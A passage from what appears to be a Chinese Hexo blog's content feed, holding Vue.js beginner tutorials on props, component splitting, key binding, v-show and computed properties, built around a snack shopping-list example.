class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Test</span> <span class="keyword">from</span> <span class="string">&quot;./Test.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">components</span>: &#123;<span class="title class_">Test</span>&#125;,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;test :title=&quot;title1&quot;&gt;&lt;/test&gt;</span></span><br><span class="line"><span class="string">        &lt;test :title=&quot;title2&quot;&gt;&lt;/test&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">title1</span>: <span class="string">&#x27;test1&#x27;</span>,</span><br><span class="line">            <span class="attr">title2</span>: <span class="string">&#x27;test2&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以从父组件传递值给Test组件，最终效果如下</p><p><img src="https://image.icewindy.cn/202303271503498.png" alt="image-20230327150300471"></p><p>结合蛋老师的视频例子来看，我们发现<code>已购清单</code>和<code>未购清单</code>的结构是相同的，因此我们可以写成一个组件，并且利用props达到组件复用的效果</p><p>我们可以新建一个<code>AppSectionsList.js</code>来编写我们的子组件，将我们改写后的组件放入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span><span class="string">`</span></span><br><span class="line"><span class="string">      &lt;section v-show=&quot;filter.length&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;h2&gt;&#123;&#123; title &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;ul&gt;</span></span><br><span class="line"><span class="string">        &lt;li v-for=&quot;food in filter&quot; :key=&quot;food.id&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;img :src=&quot;food.image&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;span&gt;&#123;&#123; food.name &#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">          &lt;input type=&quot;checkbox&quot; v-model=&quot;food.purchased&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/li&gt;</span></span><br><span class="line"><span class="string">      &lt;/ul&gt;</span></span><br><span class="line"><span class="string">      &lt;/section&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="title class_">String</span>, <span class="comment">//已购/未购标题</span></span><br><span class="line">        <span class="attr">filter</span>: <span class="title class_">Array</span> <span class="comment">//过滤器返回的列表</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们要修改我们的父组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">AppSectionsList</span> <span class="keyword">from</span> <span class="string">&quot;./AppSectionsList.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">components</span>: &#123;<span class="title class_">AppSectionsList</span>&#125;,</span><br><span class="line">    <span class="comment">/* 修改部分 */</span></span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span> <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;app-sections-list</span></span><br><span class="line"><span class="string">            title=&quot;已购清单&quot;</span></span><br><span class="line"><span class="string">            :filter=&quot;filters.afterBuy&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/app-sections-list&gt;</span></span><br><span class="line"><span class="string">        &lt;app-sections-list</span></span><br><span class="line"><span class="string">            title=&quot;未购清单&quot;</span></span><br><span class="line"><span class="string">            :filter=&quot;filters.beforeBuy&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/app-sections-list&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="comment">/***********/</span></span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">foods</span>: [</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/辣味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;炭烧味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/炭烧味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">computed</span>: &#123;</span><br><span class="line">        <span class="comment">/* 修改部分 */</span></span><br><span class="line">        <span class="title function_">filters</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">beforeBuy</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span>),</span><br><span class="line">                <span class="attr">afterBuy</span>: <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**********/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（4）：组件</title>
      <link href="/2023/03/26/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%884%EF%BC%89%EF%BC%9A%E7%BB%84%E4%BB%B6/"/>
      <url>/2023/03/26/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%884%EF%BC%89%EF%BC%9A%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>在Vue的createApp方法中，除了<code>data()&#123;&#125;</code>存放映射到页面的值、<code>computed</code>存放方法，还有一个属性<code>template</code>，这个属性说白了就是用来写HTML文件的。</p><p>由于Vue是挂载到DOM上的，因此我们可以通过<code>template</code>属性，把我们组件的HTML代码编写在里面，就可以不用多次书写HTML，可以用Vue一对多挂载上去</p><p>Vuejs一大特点就是组件式开发，组件式开发简单来说就是把一个网页各部分都拆分开来，当作一个个组件进行开发，组件就是一个个单独可用的功能块，然后通过复用组件达到代码的复用的效果。</p><h2 id="根组件">根组件</h2><p>我们目前写的这个网页可以看作是一个根组件，我们可以通过组件拆分的方式拆分我们的根组件，将其拆分为不同功能块的子组件。</p><p>首先我们创建一个<code>components</code>文件夹，用来存放组件，然后我们在里面创建一个App.js，这个文件用来存放我们的根组件，我们将我们index.html代码移动过来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span> <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;section v-show=&quot;beforeBuy.length&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;未购零食&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li v-for=&quot;food in beforeBuy&quot; :key=&quot;food.id&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;img :src=&quot;food.image&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;span&gt;&#123;&#123; food.name &#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=&quot;checkbox&quot; v-model=&quot;food.purchased&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        &lt;/section&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;section v-show=&quot;afterBuy.length&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;已购零食&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li v-for=&quot;food in afterBuy&quot; :key=&quot;food.id&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;img :src=&quot;food.image&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;span&gt;&#123;&#123; food.name &#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=&quot;checkbox&quot; v-model=&quot;food.purchased&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        &lt;/section&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">foods</span>: [</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/辣味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;炭烧味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/炭烧味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">computed</span>: &#123;</span><br><span class="line">        <span class="title function_">beforeBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">afterBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，我们需要修改index.html的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./components/App.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样我们就把index.html的内容搬迁到根组件了</p><h2 id="拆组件">拆组件</h2><p>不过，这样搬迁显得组件似乎没什么作用，因此我们应该把根组件拆分成不同的组件，从而达到我们之前提及的效果。因此我们将我们当前根组件的内容先构建出一个组件，创建一个新的文件<code>AppSections</code>，将我们之前的内容搬迁过去，只留下空的<code>computed</code>，目前我们的代码大概是这样：</p><p><strong>AppSections</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="comment">/*html*/</span> <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;section v-show=&quot;beforeBuy.length&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;未购零食&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li v-for=&quot;food in beforeBuy&quot; :key=&quot;food.id&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;img :src=&quot;food.image&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;span&gt;&#123;&#123; food.name &#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=&quot;checkbox&quot; v-model=&quot;food.purchased&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        &lt;/section&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;section v-show=&quot;afterBuy.length&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;已购零食&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li v-for=&quot;food in afterBuy&quot; :key=&quot;food.id&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;img :src=&quot;food.image&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;span&gt;&#123;&#123; food.name &#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=&quot;checkbox&quot; v-model=&quot;food.purchased&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;/ul&gt;</span></span><br><span class="line"><span class="string">        &lt;/section&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">foods</span>: [</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/原味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/辣味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;炭烧味鱿鱼丝&#x27;</span>, <span class="attr">image</span>: <span class="string">&#x27;./images/炭烧味鱿鱼丝.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">computed</span>: &#123;</span><br><span class="line">        <span class="title function_">beforeBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">afterBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>App.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">AppSections</span> <span class="keyword">from</span> <span class="string">&quot;./AppSections&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">``</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在引用子组件之前我们还需要注册组件，通过template同级的属性<code>components</code>属性，我们填入一个对象，在对象内填入组件的名字即可。注册组件后，我们就可以使用HTML标签的嵌入我们的子组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import AppSections from &quot;./AppSections.js&quot;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    components: &#123; AppSections &#125;,</span><br><span class="line">    template: `</span><br><span class="line">        <span class="tag">&lt;<span class="name">app-sections</span>&gt;</span><span class="tag">&lt;/<span class="name">app-sections</span>&gt;</span></span><br><span class="line">    `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得注意的是，由于HTML不区分大小写，我们坨锋命名的名字需要改写成小写和<code>-</code>连接。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Vuejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuejs开发入门（3）：key、v-show、computed</title>
      <link href="/2023/03/25/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%883%EF%BC%89%EF%BC%9Akey%E3%80%81v-show%E3%80%81computed/"/>
      <url>/2023/03/25/Vuejs%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8%EF%BC%883%EF%BC%89%EF%BC%9Akey%E3%80%81v-show%E3%80%81computed/</url>
      
        <content type="html"><![CDATA[<h2 id="filter">filter</h2><p>现在我们完成一个需求，将显示区域划分为上下两个部分，一个是零食的未购区域，一个是零食的已购区域。</p><p>首先我们需要将已购买和未购买筛选出来，这时候我们就用到了数组的filter方法，我们在v-for对foods添加filter方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>已购零食<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;food in foods.filter(item =&gt; item.purchased)&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;food.image&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; food.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;food.purchased&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>未购零食<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;food in foods.filter(item =&gt; !item.purchased)&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;food.image&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; food.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;food.purchased&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这时候，我们会发现我们页面出现了一些问题，它并不能好好的工作。</p><p><img src="https://image.icewindy.cn/202303261243075.png" alt="image.png"></p><h2 id="key">key</h2><p>上面这个问题是因为，vue在进行遍历数组的时候，实际上是遍历得到<code>item,index</code>，而Vue默认会将<code>key</code>绑定到<code>index</code>，而<code>key</code>是Vue用来跟踪和更新元素的。</p><p>也就是说我们页面上显示的元素，是index所对的结果。因此对于数组来说，上下两个清单就会出现相同的<code>key</code>。因此我们需要显式的改写<code>key</code>绑定的值。</p><p>一般而言，我们会选择一个不相同的值（主键）作为这个<code>key</code>，因此我们这里选择id这个值作为<code>key</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;food in foods.filter(item =&gt; item.purchased)&quot;</span> <span class="attr">v-bind:key</span>=<span class="string">&quot;food.id&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;food in foods.filter(item =&gt; !item.purchased)&quot;</span> <span class="attr">v-bind:key</span>=<span class="string">&quot;food.id&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于v-bind经常需要用到，因此Vue提供了一个缩写给我吗使用—— <code>:</code>，直接用<code>:</code>就可以替代<code>v-bind:</code>。</p><p>修改完成后，我们重新回到页面，会发现我们的问题修复了。</p><h2 id="v-show">v-show</h2><p><code>v-show</code>可以使得元素展示或者不展示在页面上。它有两个取值，如果为true，则会显示元素，如果为false，则不显示。</p><p>我们利用这个属性可以完成需求，我们想要当已购零食或者未购零食为空时，则隐藏标题。由于我们filter返回的是数组，因此我们可以用数组长度来判断是否显示，我们可以将代码这么改</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;foods.filter(item =&gt; item.purchased).length&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;foods.filter(item =&gt; !item.purchased).length&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202303261404334.png" alt="image.png"></p><h2 id="computed">computed</h2><p>由于感觉过滤这部分内容重复过高，因此我们可以通过computed来将这部分代码单独列出来，作为一个函数。</p><p>computed是一个在createApp内的一个对象，因此我们是需要在data()外编写的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line"><span class="title function_">beforeBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">foods</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span>);</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="title function_">afterBuy</span>(<span class="params"></span>) 